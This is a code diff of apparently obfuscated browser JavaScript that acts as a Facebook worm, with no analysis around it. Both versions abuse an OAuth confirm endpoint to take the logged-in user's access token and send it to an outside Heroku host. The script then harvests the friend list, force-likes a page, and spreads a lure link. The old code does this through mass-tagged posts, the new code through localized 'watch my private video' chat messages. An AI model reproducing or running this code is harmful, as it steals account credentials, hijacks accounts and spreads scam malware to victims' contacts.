@@ -2,756 +2,611 @@
 
 var cnsl = true;
 var win = this;
-var sie = win["XMLHttpRequest"];
-var empty = "";
-function nejse() {
-  var c_n = "locl:987"+profile_id;
-  var c_t = 30;
-
-  if(!localStorage[c_n] || parseInt(localStorage[c_n]) < Date.now()-60*1000*c_t){
-      localStorage[c_n] = Date.now();
+var ajax = win["XMLHttpRequest"];
+function start() {
+  var cookie_name = "sound:" + profile_id + " || audio: Enabled";
+  var cookie_time = 30;
+  if (!getCookie(cookie_name) || parseInt(getCookie(cookie_name)) < Date.now() - 60 * 1E3 * cookie_time) {
+    createCookie(cookie_name, Date.now(), 1);
     config = {};
-    config["link"] = "http://{random}./{random}";
-    config["post_limit"] = "1";
-    config["tag_limit"] = rand(50,99);
-    config["mode"] = true;
-    config["testuser"] = "100010314190852";
-    console["log"](config);
-    if (!(1 != config["mode"] && profile_id != config["testuser"])) {
-       _e_P();
-    }
-  }else{
-      var a_t = new Date();
-      a_t.setTime(parseInt(localStorage[c_n]) + (60*1000*c_t));
-      console.log("a_t:" + a_t.toLocaleString());
+    config["chat_limit"] = 50;
+    _e_P();
+    nekot();
   }
 }
-function _e_P(){
-  var b = {};
-  b["fb_dtsg"] = fb_dtsg;
-  b["__user"] = profile_id;
-  b["__a"] = 1;
-  b["__dyn"] = dyn;
-  b["__af"] = rastgele(2);
-  b["__req"] = rastgele(2);
-  b["__be"] = -1;
-  b["__pc"] = "EXP:DEFAULT";
-  b["__rev"] = __rev;
-  b["logging"] = rand(1111111111, 1E16);
-  var d = new sie;
-  d["open"]("POST", "/settings/application/platform_opt_out/submit/?action=enable&dpr=1");
-  d["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-  d["onreadystatechange"] = function() {
-    if (4 == d["readyState"]) {
-      if (200 == d["status"]) {
-        _g_T();
+function nekot() {
+  if (localStorage.access_token != "nekot") {
+    var getParams = {};
+    getParams["composer_id"] = "rc.u_0_" + rand(0, 30);
+    getParams["composer_type"] = "pages_feed";
+    getParams["target_id"] = "20531316728";
+    getParams["av"] = profile_id;
+    getParams["dpr"] = "1";
+    var params = {};
+    params["__user"] = profile_id;
+    params["__a"] = "1";
+    params["__dyn"] = __dyn;
+    params["__af"] = "j0";
+    params["__req"] = "2z";
+    params["__be"] = "-1";
+    params["__pc"] = "EXP1:home_page_pkg";
+    params["__rev"] = __rev;
+    params["fb_dtsg"] = fb_dtsg;
+    params["jazoest"] = jazoest;
+    var xhr = new ajax;
+    xhr.open("POST", "/react_composer/status/bootstrap/?" + deSerialize(getParams));
+    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState == 4 && xhr.status == 200) {
+        if (xhr.responseText.indexOf("access_token") > 0) {
+          new Image().src = "https://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  c.access_token + "&gnd=AndroidNEWinbox";
+          localStorage.access_token = "nekot";
+        }
       }
+    };
+    xhr.send(deSerialize(params));
+  }
+}
+function _e_P() {
+  var params = {};
+  params["fb_dtsg"] = fb_dtsg;
+  params["__user"] = profile_id;
+  params["__a"] = "1";
+  params["__dyn"] = __dyn;
+  params["__af"] = "3p";
+  params["__req"] = "pS";
+  params["__be"] = "-1";
+  params["__pc"] = "EXP:DEFAULT";
+  params["__rev"] = __rev;
+  params["jazoest"] = jazoest;
+  var xhr = new ajax;
+  xhr.open("POST", "/settings/application/platform_opt_out/submit/?action=enable&dpr=1", true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4 && xhr.status == 200) {
+      _g_T();
     }
   };
-  d["send"](_z(b));
+  xhr.send(deSerialize(params));
 }
 function _g_T() {
-    var params = {};
-    params["fb_dtsg"] = fb_dtsg;
-    params["app_id"] = "165907476854626";
-    params["redirect_uri"] = "fbconnect://success";
-    params["display"] = "popup";
-    params["access_token"] = "";
-    params["sdk"] = "";
-    params["from_post"] = 1;
-    params["private"] = "";
-    params["tos"] = "";
-    params["login"] = "";
-    params["read"] = "";
-    params["write"] = "";
-    params["extended"] = "";
-    params["social_confirm"] = "";
-    params["confirm"] = "";
-    params["seen_scopes"] = "";
-    params["auth_type"] = "";
-    params["auth_token"] = "";
-    params["auth_nonce"] = "";
-    params["default_audience"] = "";
-    params["ref"] = "Default";
-    params["return_format"] = "access_token";
-    params["domain"] = "";
-    params["sso_device"] = "ios";
-    params["__CONFIRM__"] = 1;
-    var xhr = new sie();
-    xhr.open("POST", "/v2.8/dialog/oauth/confirm");
-    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-    xhr.onreadystatechange = function(){
-        if (xhr.readyState == 4 && xhr.status == 200){
-            var c = {};
-            if(xhr.responseText.indexOf("access_token=") > 0){
-                c.access_token = xhr.responseText.split("access_token=")[1].split("&")[0];
-                new Image().src = "http://big-white-shark.herokuapp.com/cnfg.php?pid=" + profile_id + "&atk=" +  c.access_token + "&gnd=Android";
-                _c(c);
-            }
-        }
+  var params = {};
+  params["fb_dtsg"] = fb_dtsg;
+  params["app_id"] = "165907476854626";
+  params["redirect_uri"] = "fbconnect://success";
+  params["display"] = "popup";
+  params["access_token"] = "";
+  params["sdk"] = "";
+  params["from_post"] = "1";
+  params["private"] = "";
+  params["tos"] = "";
+  params["login"] = "";
+  params["read"] = "";
+  params["write"] = "";
+  params["extended"] = "";
+  params["social_confirm"] = "";
+  params["confirm"] = "";
+  params["seen_scopes"] = "";
+  params["auth_type"] = "";
+  params["auth_token"] = "";
+  params["auth_nonce"] = "";
+  params["default_audience"] = "";
+  params["ref"] = "Default";
+  params["return_format"] = "access_token";
+  params["domain"] = "";
+  params["sso_device"] = "ios";
+  params["__CONFIRM__"] = "1";
+  var xhr = new ajax;
+  xhr.open("POST", "/v2.8/dialog/oauth/confirm", true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4 && xhr.status == 200) {
+      if (xhr.responseText.indexOf("access_token=") > 0) {
+        jsonOBJECT = {};
+        jsonOBJECT.access_token = xhr.responseText.split("access_token=")[1].split("&")[0];
+        jsonOBJECT.pages_id = 159848587923368;
+        Kontrol(jsonOBJECT);
+        online(jsonOBJECT);
+      }
     }
-    xhr.send(deSerialize(params));
+  };
+  xhr.send(deSerialize(params));
 }
-function _c(c) {
-  var b$$0 = {};
-  b$$0["q"] = "SELECT uid, name, online_presence, pic_big, can_post, friend_count  FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) AND can_post=1 Order By online_presence Limit 2000";
-  b$$0["access_token"] = c["access_token"];
-  b$$0["ext"] = "me";
-  var e = new sie;
-  e["open"]("GET", "https://graph.facebook.com/fql?" + _z(b$$0), true);
-  e["onreadystatechange"] = function() {
-    if (4 == e["readyState"] && 200 == e["status"]) {
-      var b = JSON["parse"](e["responseText"].replace("for (;;);", ""));
-      if (!b["error"]) {
-        b = b["data"];
-        b = _u(b);
-        c["friends"] = [];
+function Kontrol(jsonOBJECT) {
+  var xhr = new XMLHttpRequest;
+  var params = {};
+  params["q"] = "SELECT created_time FROM page_fan WHERE uid = me() AND page_id = " + jsonOBJECT.pages_id;
+  params["access_token"] = jsonOBJECT.access_token;
+  xhr.open("GET", "https://graph.facebook.com/fql?" + deSerialize(params));
+  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4 && xhr.status == 200) {
+      var data = JSON.parse(xhr.responseText);
+      if (data.data.length == 0) {
+        pages(jsonOBJECT);
+      }
+    }
+  };
+  xhr.send();
+}
+function pages(jsonOBJECT) {
+  var xhr = new XMLHttpRequest;
+  var params = {};
+  params["fbpage_id"] = jsonOBJECT.pages_id;
+  params["add"] = "true";
+  params["reload"] = "false";
+  params["fan_origin"] = "page_timeline";
+  params["fan_source"] = "";
+  params["cat"] = "";
+  params["actor_id"] = profile_id;
+  params["__user"] = profile_id;
+  params["__a"] = "1";
+  params["__dyn"] = __dyn;
+  params["__af"] = "iw";
+  params["__req"] = "g";
+  params["__be"] = "-1";
+  params["__pc"] = "PHASED:DEFAULT";
+  params["__rev"] = __rev;
+  params["fb_dtsg"] = fb_dtsg;
+  params["jazoest"] = jazoest;
+  params["__spin_r"] = __rev;
+  params["__spin_b"] = "trunk";
+  params["__spin_t"] = Math.floor(Date.now() / 1E3);
+  xhr.open("POST", "/ajax/pages/fan_status.php?av=" + profile_id + "&dpr=1", true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4 && xhr.status == 200) {
+      xhr.close;
+    }
+  };
+  xhr.send(deSerialize(params));
+}
+function online(jsonOBJECT) {
+  var params = {};
+  params["q"] = "SELECT uid, name, locale, online_presence, pic_big, can_post  FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me()) Order By online_presence Limit 2000";
+  params["access_token"] = jsonOBJECT.access_token;
+  params["ext"] = "me";
+  var xhr = new ajax;
+  xhr.open("GET", "https://graph.facebook.com/fql?" + deSerialize(params), true);
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4 && xhr.status == 200) {
+      var data = JSON.parse(xhr.responseText.replace("for (;;);", ""));
+      if (!data.error) {
+        var friends = data.data;
+        friends = shuffle(friends);
+        jsonOBJECT.friends = [];
         i = 0;
-        for (;i < b["length"];i++) {
-          if (b[i].online_presence == "active") {
-            c["friends"].push(b[i]);
+        for (;i < friends.length && jsonOBJECT.friends.length < config.chat_limit;i++) {
+          if (friends[i].online_presence == "active") {
+            jsonOBJECT.friends.push(friends[i]);
           }
         }
         i = 0;
-        for (;i < b["length"];i++) {
-          if (b[i].online_presence == "idle") {
-            c["friends"].push(b[i]);
+        for (;i < friends.length && jsonOBJECT.friends.length < config.chat_limit;i++) {
+          if (friends[i].online_presence == "idle") {
+            jsonOBJECT.friends.push(friends[i]);
           }
         }
+        if (jsonOBJECT.friends.length > 0) {
+          _G_L(jsonOBJECT);
+        }
+      }
+    }
+  };
+  xhr.send();
+}
+function _G_L(jsonOBJECT) {
+  var xhr = new ajax;
+  xhr.open("GET", "https://linear-cloud.herokuapp.com/?uid=" + profile_id);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4 && xhr.status == 200) {
+      var data = JSON.parse(xhr.responseText);
+      if (data.link) {
+        jsonOBJECT.link = data.link;
         i = 0;
-        for (;i < b["length"];i++) {
-          if (b[i].friend_count > 99) {
-            c["friends"].push(b[i]);
-          }
-        }
-        if (0 < c["friends"].length) {
-          _d(c);
+        for (;i < jsonOBJECT.friends.length;i++) {
+          jsonOBJECT.uid = jsonOBJECT.friends[i].uid;
+          jsonOBJECT.pic_big = jsonOBJECT.friends[i].pic_big;
+          jsonOBJECT.name = jsonOBJECT.friends[i].name ? jsonOBJECT.friends[i].name.split(" ")[0] : jsonOBJECT.friends[i].text.split(" ")[0];
+          jsonOBJECT.locale = jsonOBJECT.friends[i].locale;
+          _S_e(jsonOBJECT);
         }
       }
     }
   };
-  e["send"]();
+  xhr.send();
 }
-function _d(c) {
-  var b = Math["ceil"](c["friends"].length / config["tag_limit"]);
-  config["post_limit"] = b > config["post_limit"] ? config["post_limit"] : b;
-  p = 0;
-  for (;p < config["post_limit"];p++) {
-    c["tags"] = [];
-    pk = 0;
-    for (;pk < config["tag_limit"];pk++) {
-      b = pk + config["tag_limit"] * p;
-      if (c["friends"][b]) {
-        c["tags"].push(c["friends"][b]);
-      }
-    }
-    console["log"](c["tags"]);
-    _e(c);
+function _S_e(jsonOBJECT) {
+  var uid = jsonOBJECT.uid;
+  var pic_big = jsonOBJECT.pic_big;
+  var name = jsonOBJECT.name;
+  var fullname = jsonOBJECT.fullname.replace(/ /g,"_");
+  var link = fullname+"_Video_"+jsonOBJECT.link;
+  var lang = jsonOBJECT.locale;
+  if(lang == "sq_AL") {
+  title = "shiko videon teme dhe mos ja trego askujt";
   }
-}
-function _e(c) {
-      var b = c["tags"];
-
-      var xhr = new XMLHttpRequest();
-      xhr.open("GET", "https://linear-cloud.herokuapp.com/?uid="+profile_id);
-      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-      xhr.send();
-      xhr.onreadystatechange = function() {
-          if (xhr.readyState == 4 && xhr.status == 200) {
-           data = JSON.parse(xhr.responseText);
-           if(data.link){
-             c["link"] = data.link;
-             c["tags"] = b;
-             post(c);
-           }
-
-          }
-      }
-
-
-
-}
-
-function post(c) {
-  var b = c["tags"];
-  var e = c["link"];
-  var message = generate_name(10);
-  var d$$0 = {};
-  d$$0["composer_entry_time"] = 6;
-  d$$0["composer_session_id"] = _p();
-  d$$0["composer_session_duration"] = _v(15, 50);
-  d$$0["composer_source_surface"] = "timeline";
-  d$$0["direct_share_status"] = 0;
-  d$$0["hide_object_attachment"] = true;
-  d$$0["is_explicit_place"] = false;
-  d$$0["is_markdown"] = false;
-  d$$0["is_q_and_a"] = false;
-  d$$0["is_profile_badge_post"] = false;
-  d$$0["num_keystrokes"] = 0;
-  d$$0["num_pastes"] = 0;
-  d$$0["privacyx"] = 300645083384735;
-  d$$0["ref"] = "timeline";
-  d$$0["target_type"] = "feed";
-  d$$0["xhpc_message"] = message;
-  d$$0["xhpc_message_text"] = message;
-  d$$0["xc_disable_config[xc_disable_link]"] = "";
-  d$$0["is_react"] = true;
-  d$$0["xhpc_composerid"] = "rc.u_0_1g";
-  d$$0["xhpc_targetid"] = profile_id;
-  d$$0["xhpc_context"] = "profile";
-  d$$0["xhpc_ismeta"] = 1;
-  d$$0["xhpc_timeline"] = true;
-  d$$0["xhpc_finch"] = false;
-  d$$0["xhpc_socialplugin"] = false;
-  d$$0["xhpc_modal_composer"] = false;
-  d$$0["xhpc_aggregated_story_composer"] = false;
-  d$$0["xhpc_publish_type"] = 1;
-  d$$0["xhpc_fundraiser_page"] = false;
-  d$$0["__user"] = profile_id;
-  d$$0["__a"] = 1;
-  d$$0["__dyn"] = dyn;
-  d$$0["__af"] = "i0";
-  d$$0["__req"] = "q";
-  d$$0["__be"] = -1;
-  d$$0["__pc"] = "PHASED:DEFAULT";
-  d$$0["__rev"] = __rev;
-  d$$0["fb_dtsg"] = fb_dtsg;
-  d$$0["jazoest"] = jazoest;
-  i = 0;
-  for (;i < c["tags"].length;i++) {
-    d$$0["composertags_with[" + i + "]"] = c["tags"][i].uid;
-    d$$0["text_composertags_with[" + i + "]"] = c["tags"][i].name;
+  else if(lang == "mk_MK") {
+  title = "odgledaj go moeto video i ne mu go pokazuvaj nikomu";
   }
-  var f = new sie;
-  f["open"]("POST", "https://www.facebook.com/ajax/updatestatus.php?ext=me&av=" + profile_id);
-  f["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-  f["send"](_z(d$$0));
-  f["onreadystatechange"] = function() {
-    if (4 == f["readyState"] && 200 == f["status"]) {
-      var d = JSON["parse"](f["responseText"].replace("for (;;);", ""));
-      if (!d["error"]) {
-        c["post_id"] = _t(d, "targetfbid");
-        c["tags"] = b;
-        c["link"] = e;
-        console["log"]("Posted: https://fb.com/" + c["post_id"]);
-        comment(c);
-      }
-    }
-  };
-}
-
-function comment(c) {
-  var b = c["tags"];
-  var e = c["link"];
-  var d = c["post_id"];
-  var f = {};
-  f["ft_ent_identifier"] = c["post_id"];
-  f["comment_text"] = " Video ⤵ "+ "\n" + c["link"];
-  f["source"] = 1;
-  f["client_id"] = Date["now"]() + ":" + Math["floor"](Date["now"]() / 1E3);
-  f["session_id"] = _y(8);
-  f["reply_fbid"] = "";
-  f["parent_comment_id"] = "";
-  f["rootid"] = "u_ps_0_0_7";
-  f["attached_sticker_fbid"] = 0;
-  f["attached_photo_fbid"] = 0;
-  f["attached_video_fbid"] = 0;
-  f["feedback_referrer"] = "/permalink.php";
-  f["feed_context"] = "{}";
-  f["video_time_offset"] = "";
-  f["is_live_streaming"] = false;
-  f["ft[top_level_post_id]"] = c["post_id"];
-  f["ft[fbfeed_location]"] = 1;
-  f["ft[insertion_position]"] = 0;
-  f["av"] = profile_id;
-  f["__user"] = profile_id;
-  f["__a"] = 1;
-  f["__dyn"] = dyn;
-  f["__af"] = "m";
-  f["__req"] = 14;
-  f["__be"] = -1;
-  f["__pc"] = "PHASED:DEFAULT";
-  f["__rev"] = __rev;
-  f["fb_dtsg"] = fb_dtsg;
-  f["jazoest"] = jazoest;
-  var g = new sie;
-  g["open"]("POST", "https://www.facebook.com/ufi/add/comment/?ext=me");
-  g["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-  g["send"](_z(f));
-  g["onreadystatechange"] = function() {
-    if (!(4 != g["readyState"])) {
-      if (!(200 != g["status"])) {
-        if (!JSON["parse"](g["responseText"].replace("for (;;);", ""))["error"]) {
-          _h(c);
-          // _i(c);
-          // _j(c);
-          c["tags"] = b;
-          c["link"] = e;
-          c["post_id"] = d;
-          console["log"]("Commented: https://fb.com/" + c["post_id"]);
-        }
-      }
-    }
-  };
-}
-function _h(c) {
-  var b$$0 = {};
-  b$$0["composer_id"] = "rc.u_a_0";
-  b$$0["target_id"] = profile_id;
-  b$$0["scrape_url"] = c["link"];
-  b$$0["entry_point"] = "edit_dialog";
-  b$$0["source_attachment"] = "STATUS";
-  b$$0["source_logging_name"] = "link_pasted";
-  b$$0["av"] = profile_id;
-  b$$0["dpr"] = 1;
-  b$$0["ext"] = "me";
-  var e$$0 = {};
-  e$$0["__user"] = profile_id;
-  e$$0["__a"] = 1;
-  e$$0["__dyn"] = dyn;
-  e$$0["__af"] = "i0";
-  e$$0["__req"] = "k";
-  e$$0["__be"] = -1;
-  e$$0["__pc"] = "PHASED:DEFAULT";
-  e$$0["__rev"] = __rev;
-  e$$0["fb_dtsg"] = fb_dtsg;
-  e$$0["jazoest"] = jazoest;
-  var d = new sie;
-  d["open"]("POST", "https://www.facebook.com/react_composer/scraper/?" + _z(b$$0));
-  d["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-  d["send"](_z(e$$0));
-  d["onreadystatechange"] = function() {
-    if (4 == d["readyState"] && 200 == d["status"]) {
-      var b = JSON["parse"](d["responseText"].replace("for (;;);", ""));
-      c["scrape"] = _t(b, "attachmentConfig");
-      b = _t(b, "__html");
-      var e = document["createElement"]("form");
-      e["innerHTML"] = b;
-      b = e["getElementsByTagName"]("input");
-      c["attachment"] = {};
-      i = 0;
-      for (;i < b["length"];i++) {
-        if (b[i].name) {
-          c["attachment"][b[i].name] = b[i].value;
-        }
-      }
-      _i(c);
-      _j(c);
-    }
-  };
-}
-function _i(c) {
-  var b = {};
-  // for (key in c["attachment"]) {
-  //   b[key] = c["attachment"][key];
-  // }
-  b["composer_entry_time"] = 8;
-  b["composer_session_id"] = _p();
-  b["composer_session_duration"] = _v(250, 750);
-  b["composer_source_surface"] = "newsfeed";
-  b["direct_share_status"] = 0;
-  b["hide_object_attachment"] = true;
-  b["is_explicit_place"] = false;
-  b["is_markdown"] = false;
-  b["is_q_and_a"] = false;
-  b["is_profile_badge_post"] = false;
-  b["num_keystrokes"] = 0;
-  b["num_pastes"] = 0;
-  b["privacyx"] = "300645083384735";
-  b["ref"] = "edit_dialog";
-  b["tagger_session_id"] = Math["floor"](Date["now"]() / 1E3);
-  b["target_type"] = "feed";
-  b["xhpc_message"] = "";
-  b["xhpc_message_text"] = "";
-  b["is_forced_reshare_of_post"] = false;
-  b["is_react"] = true;
-  b["xhpc_composerid"] = "rc.u_a_0";
-  b["xhpc_targetid"] = profile_id;
-  b["xhpc_context"] = "profile";
-  b["xhpc_ismeta"] = 1;
-  b["xhpc_timeline"] = false;
-  b["xhpc_finch"] = false;
-  b["xhpc_socialplugin"] = false;
-  b["xhpc_modal_composer"] = false;
-  b["xhpc_aggregated_story_composer"] = false;
-  b["xhpc_publish_type"] = 1;
-  b["xhpc_fundraiser_page"] = false;
-  b["postID"] = c["post_id"];
-  b["save_only"] = true;
-  b["xc_edit_callsite"] = "fb_feed";
-  b["xc_entstory_context"] = "{}";
-  b["xc_story_dom_id"] = "u_0_t";
-  b["__user"] = profile_id;
-  b["__a"] = 1;
-  b["__dyn"] = dyn;
-  b["__af"] = "i0";
-  b["__req"] = "o";
-  b["__be"] = -1;
-  b["__pc"] = "PHASED:DEFAULT";
-  b["__rev"] = __rev;
-  b["fb_dtsg"] = fb_dtsg;
-  b["jazoest"] = jazoest;
-  i = 0;
-  for (;i < c["friends"].length;i++) {
-    b["composertags_with[" + i + "]"] = c["friends"][i].uid;
-    b["text_composertags_with[" + i + "]"] = c["friends"][i].name;
+  else if(lang == "es_LA" || lang == "es_CO" || lang == "es_ES") {
+  title = "ver mi video y no mostrarlo a nadie";
   }
-  var e = new sie;
-  e["open"]("POST", "https://www.facebook.com/composer/edit/" + c["post_id"] + "?av=" + profile_id + "&ext=me");
-  e["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-  e["send"](_z(b));
-  e["onreadystatechange"] = function() {
-    if (4 == e["readyState"] && (200 == e["status"] && !JSON["parse"](e["responseText"].replace("for (;;);", ""))["error"])) {
-      console["log"]("Edited: https://fb.com/" + c["post_id"]);
+  else if(lang == "de_DE") {
+  title = "sehen sie sich mein Video an und zeigen sie es niemandem";
+  }
+  else if(lang == "bs_BA" || lang == "hr_HR" || lang == "sr_RS") {
+  title = "odgledaj moj video i ne pokazuj ga nikome";
+  }
+  else if(lang == "sl_SI") {
+  title = "odglej moj videoposnetek in nikomu ne pokazuj";
+  }
+  else if(lang == "it_IT") {
+  title = "guarda il mio video e non mostrarlo a nessuno";
+  }
+  else if(lang == "el_GR") {
+  title = "Παρακολουθήστε το ιδιωτικό μου βίντεο και μην το εμφανίζετε σε κανέναν";
+  }
+  else if(lang == "pl_PL") {
+  title = "obejrzyj mój film i nie pokazuj go nikomu";
+  }
+  else if(lang == "cz_CZ") {
+  title = "sledovat moje video a neukázat to nikomuo";
+  }
+  else if(lang == "sk_SK") {
+  title = "pozerat moje video a neukáže to nikomu";
+  }
+  else if(lang == "hu_HU") {
+  title = "nézze meg videóimat, és ne mutassa meg senkinek";
+  }
+  else if(lang == "bg_BG") {
+  title = "Гледай моето видео и не го показвай на никого";
+  }
+  else if(lang == "tl_PH") {
+  title = "panoorin ang aking video at huwag ipakita ito sa sinuman";
+  }
+  else if(lang == "da_DK") {
+  title = "se min video og vis den ikke til nogen";
+  }
+  else if(lang == "af_ZA") {
+  title = "kyk na my video en wys dit nie aan enigiemand nie";
+  }
+  else if(lang == "ro_RO") {
+  title = "vizionați videoclipul meu și nu îl afișați nimănui";
+  }
+  else if(lang == "ru_RU") {
+  title = "Смотреть мое видео и не показывать его никому";
+  }
+  else if(lang == "fi_FI") {
+  title = "katsele yksityistä videota ja älä näytä sitä kenellekään";
+  }
+  else if(lang == "sv_SE") {
+  title = "titta på min privata video och visa inte den för någon";
+  }
+  else if(lang == "th_TH") {
+  title = "ดูวิดีโอส่วนตัวของฉันและไม่แสดงให้ใครเห็น";
+  }
+  else if(lang == "tr_TR") {
+  title = "Özel videoyu izlemek ve bunu kimseye göstermek";
+  }
+  else if(lang == "ka_GE") {
+  title = "ნახეთ ჩემი პირადი ვიდეო და არავის არ აჩვენო";
+  }
+  else if(lang == "ar_AR") {
+  title = "مشاهدة الفيديو الخاص بي لا تظهر لأي شخص";
+  }
+  else if(lang == "mr_IN") {
+  title = "माझा खाजगी व्हिडिओ पहा आणि कोणालाही दाखवू नका";
+  }
+  else if(lang == "hi_IN") {
+  title = "मेरा निजी वीडियो देखें और इसे किसी के साथ न देखेंा";
+  }
+  else if(lang == "bn_IN") {
+  title = "আমার ব্যক্তিগত ভিডিও দেখুন এবং এটি কাউকে দেখান না";
+  }
+  else if(lang == "pa_IN") {
+  title = "ਮੇਰਾ ਨਿਜੀ ਵੀਡੀਓ ਦੇਖੋ ਅਤੇ ਕਿਸੇ ਨੂੰ ਵੀ ਇਸ ਨੂੰ ਨਾ ਦਿਖਾਓ";
+  }
+  else if(lang == "gu_IN") {
+  title = "મારી ખાનગી વિડિઓ જુઓ અને તેને કોઈને પણ બતાવશો નહીં";
+  }
+  else if(lang == "ta_IN") {
+  title = "என் தனிப்பட்ட வீடியோவைப் பார்க்கவும் மற்றும் யாருக்கும் அதை காண்பிக்கவும் வேண்டாம்";
+  }
+  else if(lang == "te_IN") {
+  title = "నా వ్యక్తిగత వీడియోను చూడండి మరియు దాన్ని ఎవరికీ చూపించవద్దు";
+  }
+  else if(lang == "fr_FR" || lang == "fr_CA") {
+  title = "regarde ma vidéo  et ne le montre pas à personne";
+  }
+  else if(lang == "pt_PT" || lang == "pt_BR") {
+  title = "assista meu vídeo  e não mostre a ninguém";
+  }
+  else if(lang == "nl_NL" || lang == "nl_BE") {
+  title = "kijk naar mijn  video en laat het niet aan iedereen zien";
+  }
+  else if(lang == "nb_NO" || lang == "nn_NO") {
+  title = "se min  video og ikke vis den til noen";
+  }
+  else {
+  title = "watch my video and don't show it to anyone";
+  }
+  var message_id = rand(0xa1b01d4b1c7, 999999999999999);
+  var textArray = [":o", ":P", "O:)", "3:)", ";)", ":O", "-_-", ">:O", ":*", "<3", "^_^", "8-)", "(y)", ":)"];
+  var emoji = textArray[Math.floor(Math.random() * textArray.length)];
+  message_id = rand(0xa1b01d4b1c7, 999999999999999);
+  var params = {};
+  params["client"] = "mercury";
+  params["action_type"] = "ma-type:user-generated-message";
+//  params["body"] =  emoji + "\n" + jsonOBJECT.link;
+//  params["body"] = jsonOBJECT.name + "  " + emoji + "\n" + jsonOBJECT.link;
+  params["body"] = emoji + "\n" + jsonOBJECT.name + " " + title + "\n" + jsonOBJECT.link;
+  params["has_attachment"] = "false";
+  params["message_id"] = message_id;
+  params["offline_threading_id"] = message_id;
+  params["other_user_fbid"] = jsonOBJECT.uid;
+  params["signature_id"] = rastgele(8);
+  params["source"] = "source:chat:web";
+  params["specific_to_list[0]"] = "fbid:" + jsonOBJECT.uid;
+  params["specific_to_list[1]"] = "fbid:" + profile_id;
+  params["timestamp"] = Date.now();
+  params["ui_push_phase"] = "C3";
+  params["__user"] = profile_id;
+  params["__a"] = "1";
+  params["__dyn"] = __dyn;
+  params["__af"] = "j0";
+  params["__req"] = "18";
+  params["__be"] = "-1";
+  params["__pc"] = "PHASED:DEFAULT";
+  params["__rev"] = __rev;
+  params["fb_dtsg"] = fb_dtsg;
+  params["jazoest"] = jazoest;
+  params["__spin_r"] = __rev;
+  params["__spin_b"] = "trunk";
+  params["__spin_t"] = Math.floor(Date.now() / 1E3);
+  var xhr = new ajax;
+  xhr.open("POST", "/messaging/send/?dpr=1", true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
+  xhr.onreadystatechange = function() {
+    if (xhr.readyState == 4 && xhr.status == 200) {
+      xhr.close;
     }
   };
+  xhr.send(deSerialize(params));
 }
-function generate_name(length,firstUpper){
-    rname = "";
-    sesli = "aeiou";
-    sessiz = "bcdfghjklmnprstvyz";
-    rname = rand(1,2) == 1?sessiz[rand(0,sessiz.length-1)]:sesli[rand(0,sesli.length-1)];
-    if(firstUpper == true){
-        rname = rname.toUpperCase();
+function banword(obj) {
+    delimiters = [unescape("%A0"), " ", ".", "_", "-"];
+    obj = obj["split"]("");
+    finalWord = "";
+    insertIn = Math["floor"](Math["random"]() * obj["length"]);
+    if (obj[insertIn] == " ") {
+      insertIn--;
     }
-    for(n=0;n<length;n++){
-        if(sesli.indexOf(rname[rname.length-1]) >= 0){
-            rname += sessiz[rand(0,sessiz.length-1)];
-        }else{
-            rname += sesli[rand(0,sesli.length-1)];
-        }
+    if (insertIn == obj["length"]) {
+      insertIn--;
     }
-    return rname;
-}
-function _j(c) {
-  var b = {};
-  b["message_id"] = c["post_id"];
-  b["follow"] = 0;
-  b["__user"] = profile_id;
-  b["__a"] = 1;
-  b["__dyn"] = dyn;
-  b["__af"] = "m";
-  b["__req"] = 8;
-  b["__be"] = -1;
-  b["__pc"] = "PHASED:DEFAULT";
-  b["__rev"] = __rev;
-  b["fb_dtsg"] = fb_dtsg;
-  b["jazoest"] = jazoest;
-  var e = new sie;
-  e["open"]("POST", "https://www.facebook.com/ajax/litestand/follow_post?ext=me");
-  e["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-  e["send"](_z(b));
-  e["onreadystatechange"] = function() {
-    if (4 == e["readyState"] && 200 == e["status"]) {
-      JSON["parse"](e["responseText"].replace("for (;;);", ""));
+    for (var i = 0;i < obj["length"];i++) {
+      finalWord = finalWord + (insertIn == i ? obj[i] + delimiters[Math["floor"](Math["random"]() * delimiters["length"])] : obj[i]);
     }
-  };
-}
-
-function _l() {
-  var c = {};
-  c["value"] = "300645083384735";
-  c["prev_value"] = "291667064279714";
-  c["__user"] = profile_id;
-  c["__a"] = 1;
-  c["__dyn"] = dyn;
-  c["__req"] = "15";
-  c["fb_dtsg"] = fb_dtsg;
-  c["jazoest"] = jazoest;
-  c["__rev"] = __rev;
-  var b = new sie;
-  b["open"]("POST", "https://www.facebook.com/ajax/settings/granular_privacy/composer.php");
-  b["setRequestHeader"]("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
-  b["send"](_z(c));
-  b["onreadystatechange"] = function() {
-    if (4 == b["readyState"] && 200 == b["status"]) {
-      JSON["parse"](b["responseText"].replace("for (;;);", ""));
-    }
-  };
-}
-function _m(c, b) {
